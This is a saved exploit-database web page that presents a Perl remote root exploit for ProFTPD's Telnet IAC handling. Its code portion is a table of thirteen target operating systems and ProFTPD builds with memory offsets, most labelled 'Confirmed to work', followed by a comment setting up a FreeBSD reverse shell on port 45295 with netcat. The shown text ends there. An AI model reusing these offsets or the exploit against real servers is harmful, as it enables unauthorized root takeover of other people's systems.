<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0041)http://www.exploit-db.com/exploits/15449/ -->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<title>ProFTPD IAC Remote Root Exploit</title>
		<meta name="description" content="ProFTPD IAC Remote Root Exploit">
		<meta name="keywords" content="">
		<script type="text/javascript" src="./ProFTPD IAC Remote Root Exploit_files/shCore.js"></script>
		<script type="text/javascript" src="./ProFTPD IAC Remote Root Exploit_files/shBrushPlain.js"></script>
					<script type="text/javascript" src="./ProFTPD IAC Remote Root Exploit_files/shBrushPerl.js"></script>
		        <script type="text/javascript" src="./ProFTPD IAC Remote Root Exploit_files/jquery-1.4.2.min.js"></script>
        <script type="text/javascript" src="./ProFTPD IAC Remote Root Exploit_files/jquery.rating.pack.js"></script>
        <script type="text/javascript" src="./ProFTPD IAC Remote Root Exploit_files/jquery.fancybox-1.3.1.pack.js"></script>
        <link rel="stylesheet" href="./ProFTPD IAC Remote Root Exploit_files/jquery.fancybox-1.3.1.css" type="text/css" media="screen">
        <link type="text/css" rel="stylesheet" href="./ProFTPD IAC Remote Root Exploit_files/shCore.css">
        <link type="text/css" rel="stylesheet" href="./ProFTPD IAC Remote Root Exploit_files/shThemeDefault.css">
        <link type="text/css" rel="stylesheet" href="./ProFTPD IAC Remote Root Exploit_files/jquery.rating.css">
        <link type="text/css" rel="stylesheet" href="./ProFTPD IAC Remote Root Exploit_files/exploit.css">
		<link rel="stylesheet" id="shutter-css" href="./ProFTPD IAC Remote Root Exploit_files/shutter-reloaded.css" type="text/css" media="screen">
		<link type="text/css" rel="stylesheet" href="./ProFTPD IAC Remote Root Exploit_files/digi.css">

		<style type="text/css">
		h1 {
		font-size:22px !important;
		}
		.barColor {
		display:table;
		clear:both;
		background-color:#d5d7dd;
		width:1280px;
		border:solid #aaa 1px;
		-webkit-border-radius:5px;
		-moz-border-radius:5px;
		border-radius:5px;
		margin:10px auto 10px auto;
		}
		body {
		background-color:#292929;
		margin:0px;
		font-size:14px;
		}
		#container {
		display:block;
		background-color:#fff;
		width:1270px;
		position:relative;
		left:0px;
		padding:0 0 0 10px;
		margin:0 auto -40px auto;
		/*border:solid #ddd 1px;*/
		-webkit-border-radius:5px;
		-moz-border-radius:5px;
		border-radius:5px;
		}
		pre {
		width:1200px !important;
		overflow:auto !important;
		}
		table {
		background-color:#f5f5f5;
		border:solid #aaa 1px;
		-webkit-border-radius:5px;
		-moz-border-radius:5px;
		border-radius:5px;
		}
		
		tr.meta td {font-weight:bold; color:#606060;}
		table.comment.odd {
		width:710px;
		background-color:#f8f8f8;
		padding:10px;
		margin:10px;
		border:solid #ccc 1px;
		margin-left:auto; margin-right:auto;
		}

		table.comment.even {
		width:710px;
		background-color:#f8f8f8;
		padding:10px;
		margin:10px;
		border:solid #ccc 1px;
		margin-left:auto; margin-right:auto;
		}
		a img {
		border:none;
		border-style:none;
		}
		#screenshot_upload_form {
		margin: 0px auto 10px auto;
		}
		</style>
        <script type="text/javascript">
                SyntaxHighlighter.config.clipboardSwf = '/scripts/clipboard.swf';
                SyntaxHighlighter.all();
        </script>
	</head>
	<body>
<div class="barColor">
		
	<div id="topAd" style="position:relative; float:right; margin:5px 20px 5px 20px;">
		<script type="text/javascript"><!--
		google_ad_client = "ca-pub-0054251952045395";
		/* Exploit Database Rectangle */
		google_ad_slot = "6779138874";
		google_ad_width = 336;
		google_ad_height = 280;
		//-->
		</script>
		<script type="text/javascript" src="./ProFTPD IAC Remote Root Exploit_files/show_ads.js">
		</script><ins style="display:inline-table;border:none;height:280px;margin:0;padding:0;position:relative;visibility:visible;width:336px"><ins id="aswift_0_anchor" style="display:block;border:none;height:280px;margin:0;padding:0;position:relative;visibility:visible;width:336px"><iframe allowtransparency="true" frameborder="0" height="280" hspace="0" marginwidth="0" marginheight="0" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){i+=&#39;.call&#39;;setTimeout(h,0)}else if(h.match){i+=&#39;.nav&#39;;w.location.replace(h)}s.log&amp;&amp;s.log.push(i)}" scrolling="no" vspace="0" width="336" id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;"></iframe></ins></ins>
	</div>
					<h1 style="position:relative; left:30px;">ProFTPD IAC Remote Root Exploit</h1>
		
		<br><br>

		<table style=" position:relative; left:50px; top:-10px; height:110px; float:left;">
		
			<tbody><tr>
			<td style="background-color:#fff; padding:5px;">EDB-ID: <span class="r1">15449</span> </td>
			<td style="background-color:#fff; padding:5px;">  CVE: N/A </td>
			<td style="background-color:#fff; padding:5px;">OSVDB-ID: N/A</td>
			</tr>
				
			<tr>
			<td style="background-color:#fff; padding:5px;">Author: Kingcope</td>
			<td style="background-color:#fff; padding:5px;">Published: 2010-11-07</td>
			<td style="background-color:#fff; padding:5px;">Verified: <img src="./ProFTPD IAC Remote Root Exploit_files/accept.png" alt="Verified"></td>
			</tr>
			
			<tr>
			<td style="background-color:#fff; padding:5px;">Exploit Code: &nbsp;&nbsp;<a href="http://www.exploit-db.com/download/15449"><img src="./ProFTPD IAC Remote Root Exploit_files/46.png" style="position:relative; top:5px;" alt="Download" title="Download" border="0"></a></td>
			<td style="background-color:#fff; padding:5px;">Vulnerable App: &nbsp;&nbsp; <a href="http://www.exploit-db.com/wp-content/themes/exploit/applications/b9bb3954babe16769d679663a3951b40-proftpd-basic_1.3.3a-4_i386.deb"><img src="./ProFTPD IAC Remote Root Exploit_files/46.png" style="position:relative; top:5px;" alt="Download" title="Download" border="0"></a></td>
			<td style="background-color:#fff; padding:5px;">
			
			
			
			</td>
			</tr>
		</tbody></table>
		
		<table style="position:relative; top:-10px; height:110px;  float:left; margin-left:60px;">
		<tbody><tr><td style="background-color:#fff; margin:5px;">
		<div id="rating2">
			
			<h2 style="margin-bottom:0px; font-size:14px;">Rating</h2>
			<form action="" method="post">
				<label class="star-rating-readonly">Overall:</label>
				<span class="star-rating-control star-rating-readonly"><div class="rating-cancel" style="display: none; "><a title="Cancel Rating"></a></div><div class="star-rating rater-0 star total-rating star-rating-applied star-rating-live star-rating-on"><a title="1">1</a></div><div class="star-rating rater-0 star total-rating star-rating-applied star-rating-live star-rating-on"><a title="2">2</a></div><div class="star-rating rater-0 star total-rating star-rating-applied star-rating-live star-rating-on"><a title="3">3</a></div><div class="star-rating rater-0 star total-rating star-rating-applied star-rating-live star-rating-on"><a title="4">4</a></div><div class="star-rating rater-0 star total-rating star-rating-applied star-rating-live star-rating-on"><a title="5">5</a></div></span><input name="rate" type="radio" class="star total-rating star-rating-applied star-rating-readonly" value="1" style="display: none; ">
				<input name="rate" type="radio" class="star total-rating star-rating-applied star-rating-readonly" value="2" style="display: none; ">
				<input name="rate" type="radio" class="star total-rating star-rating-applied star-rating-readonly" value="3" style="display: none; ">
				<input name="rate" type="radio" class="star total-rating star-rating-applied star-rating-readonly" value="4" style="display: none; ">
				<input name="rate" type="radio" class="star total-rating star-rating-applied star-rating-readonly" value="5" checked="checked" style="display: none; ">
				<span class="num_value star-rating-readonly">
					(5.0)				</span>
			</form>
			<div class="clear"></div>
							<!-- 
				<p><a href="http://www.exploit-db.com/?page_id=1321?redirect_to=http://www.exploit-db.com/exploits/15449">Login</a>/<a href="">Register</a> to be able to rate exploits</p>
				 -->
						<script type="text/javascript">
			$(document).ready(function(){
				$('input.total-rating').rating('readOnly');
				$('input.my-rate').rating('readOnly');
				$("a#single_image").fancybox();
			});
			</script>
		</div> <!--end of #rating-->
		
		</td></tr></tbody></table>
					<table style="position:relative; top:-10px; height:110px; width:110px; float:left; margin-left:10px;">
				<tbody><tr>
					<td valign="middle" align="center">
						<a id="single_image" href="http://www.exploit-db.com/wp-content/themes/exploit/screenshots/idlt15500/screen-shot-2010-11-07-at-10044-pm.png"><img src="./ProFTPD IAC Remote Root Exploit_files/screen-shot-2010-11-07-at-10044-pm-thumb.png" alt="Screenshot"></a>
					</td>
				</tr>
			</tbody></table>
		
		<div style="display:table; table-layout:fixed; width:700px; float:left; margin-left:30px;">
		
				
			<a style="text-decoration:none; color:#000;" href="http://www.exploit-db.com/exploits/15448/"><img src="./ProFTPD IAC Remote Root Exploit_files/prev.png" alt="Prev" style="border:none; border-style:none;"></a>
						
			 <a style="text-decoration:none; color:#000;" href="http://www.exploit-db.com/"><img src="./ProFTPD IAC Remote Root Exploit_files/back.png" alt="Home" style="border:none; border-style:none;"></a>
			
						<a style="text-decoration:none; color:#000;" href="http://www.exploit-db.com/exploits/15450/"><img src="./ProFTPD IAC Remote Root Exploit_files/next.png" alt="Next" style="border:none; border-style:none;"></a>
					</div>

</div><!--// top color //-->
		

		 		
		<div id="container">
			<div id="highlighter_288777" class="syntaxhighlighter nogutter  "><div class="bar "><div class="toolbar"><a href="http://www.exploit-db.com/exploits/15449/#viewSource" title="view source" style="width: 16px; height: 16px; " class="item viewSource">view source</a><div class="item copyToClipboard"><embed width="16" height="16" id="highlighter_288777_clipboard" type="application/x-shockwave-flash" title="copy to clipboard" allowscriptaccess="always" wmode="transparent" flashvars="highlighterId=highlighter_288777" menu="false" src="/scripts/clipboard.swf"></div><a href="http://www.exploit-db.com/exploits/15449/#printSource" title="print" style="width: 16px; height: 16px; " class="item printSource">print</a><a href="http://www.exploit-db.com/exploits/15449/#about" title="?" style="width: 16px; height: 16px; " class="item about">?</a></div></div><div class="lines"><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments"># Exploit Title: ProFTPD IAC Remote Root Exploit</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments"># Date: 7 November 2010</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments"># Author: Kingcope</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="keyword">use</code> <code class="plain">IO::</code><code class="functions">Socket</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="variable">$numtargets</code> <code class="plain">= 13;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="variable">@targets</code> <code class="plain">=</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="plain">( </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="comments"># Plain Stack Smashing</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="comments">#Confirmed to work</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="plain">[</code><code class="string">"FreeBSD 8.1 i386, ProFTPD 1.3.3a Server (binary)"</code><code class="plain">,</code><code class="comments"># PLATFORM SPEC</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"FreeBSD"</code><code class="plain">,&nbsp; </code><code class="comments"># OPERATING SYSTEM</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="comments"># EXPLOIT STYLE</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0xbfbfe000, </code><code class="comments"># OFFSET START</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0xbfbfff00, </code><code class="comments"># OFFSET END</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">1029],&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="comments"># ALIGN</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="comments">#Confirmed to work</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="plain">[</code><code class="string">"FreeBSD 8.0/7.3/7.2 i386, ProFTPD 1.3.2a/e/c Server (binary)"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"FreeBSD"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0xbfbfe000,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0xbfbfff00,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">1021],</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="comments"># Return into Libc</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="comments">#Confirmed to work</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="plain">[</code><code class="string">"Debian GNU/Linux 5.0, ProFTPD 1.3.2e Server (Plesk binary)"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"Linux"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">1,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="comments"># EXPLOIT STYLE</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0x0804CCD4, </code><code class="comments"># write(2) offset</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">8189,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="comments"># ALIGN</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0],&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="comments"># PADDING</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="comments"># Confirmed to work</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="plain">[</code><code class="string">"Debian GNU/Linux 5.0, ProFTPD 1.3.3 Server (Plesk binary)"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"Linux"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">1,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0x0804D23C,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">4101,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0],</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="comments">#Confirmed to work</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="plain">[</code><code class="string">"Debian GNU/Linux 4.0, ProFTPD 1.3.2e Server (Plesk binary)"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"Linux"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">1,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0x0804C9A4, </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">8189,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0],&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="comments">#Confirmed to work </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="plain">[</code><code class="string">"Debian Linux Squeeze/sid, ProFTPD 1.3.3a Server (distro binary)"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"Linux"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">1,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0x080532D8, </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">4101,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">12],</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="plain">[</code><code class="string">"SUSE Linux 9.3, ProFTPD 1.3.2e Server (Plesk binary)"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"Linux"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">1,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0x0804C9C4,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">8189,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0],</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="plain">[</code><code class="string">"SUSE Linux 10.0/10.3, ProFTPD 1.3.2e Server (Plesk binary)"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"Linux"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">1,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0x0804CAA8,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">8189,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0],</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="plain">[</code><code class="string">"SUSE Linux 10.2, ProFTPD 1.3.2e Server (Plesk binary)"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"Linux"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">1,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0x0804CBBC,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">8189,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0],</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="plain">[</code><code class="string">"SUSE Linux 11.0, ProFTPD 1.3.2e Server (Plesk binary)"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"Linux"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">1,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0x0804CCBC,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">8189,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0], </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="comments">#Confirmed to work</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="plain">[</code><code class="string">"SUSE Linux 11.1, ProFTPD 1.3.2e Server (Plesk binary)"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"Linux"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">1,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0x0804CCE0,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">8189,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0],&nbsp;&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="plain">[</code><code class="string">"SUSE Linux SLES 10, ProFTPD 1.3.2e Server (Plesk binary)"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"Linux"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">1,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0x0804CA2C,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">8189,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0], </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="comments">#Confirmed to work</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;</code><code class="plain">[</code><code class="string">"CentOS 5, ProFTPD 1.3.2e Server (Plesk binary)"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"Linux"</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">1,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0x0804C290,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">8189,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">0],</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments"># feel free to add more targets.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments">#freebsd reverse shell port 45295</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments">#setup a netcat on this port 